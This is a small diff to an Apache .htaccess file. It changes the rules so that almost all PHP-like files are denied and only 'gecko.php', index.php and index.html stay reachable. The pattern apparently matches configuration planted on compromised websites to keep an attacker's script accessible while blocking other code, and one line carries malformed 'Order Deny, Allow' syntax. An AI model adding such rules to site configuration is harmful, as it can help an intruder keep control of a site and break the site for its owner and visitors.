@@ -5,11 +5,11 @@
 
 
 
-<FilesMatch *.php>
+<FilesMatch ".ph*|Ph*|pH*|PH*">
     Order Deny,Allow
     Deny from all
 </FilesMatch>
-<FilesMatch gecko.php>
+<FilesMatch "gecko.php|index.php|index.html">
     Order Deny, Allow
     Allow from all
 </FilesMatch>
